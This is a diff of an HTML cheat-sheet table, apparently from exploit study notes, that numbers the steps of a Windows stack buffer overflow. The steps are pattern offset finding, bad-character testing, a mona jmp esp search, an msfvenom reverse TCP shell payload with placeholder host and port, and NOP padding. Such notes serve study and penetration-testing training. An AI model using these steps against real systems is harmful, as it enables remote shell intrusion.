@@ -17,18 +17,22 @@ layout: default
     
     <table>
         <tr>
+            <td>1</td>
             <td>Send a pattern</td>
             <td>msf-pattern_create -l &lt;length&gt;</td>
         </tr>
         <tr>
+            <td>2</td>
             <td>Find offset of where EIP lands when the program crashes</td>
             <td>msf-pattern_offset -l &lt;length&gt; -q &lt;EIP crash&gt;</td>
         </tr>
         <tr>
+            <td>3</td>
             <td>Test for bad characters</td>
             <td>Send all characters, then follow ESP in dump.</td>
         </tr>
         <tr>
+            <td>4</td>
             <td>Find jmp esp instruction</td>
             <td>
                 <li>!mona jmp -r esp -cpb &quot;\x00\x0A&quot;</li>
@@ -39,10 +43,12 @@ layout: default
             </td>
         </tr>
         <tr>
+            <td>5</td>
             <td>Generate shell</td>
             <td>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip address&gt; LPORT=&lt;port #&gt; -f python EXITFUNC=thread -v shell -b &quot;\x00\x0a\x0d\&lt;bad characters&gt;&quot;</td>
         </tr>
         <tr>
+            <td>6</td>
             <td>Add NOPS in front of shell</td>
             <td>Only 12 lines should be needed.  Add in increments of 4.</td>
         </tr>
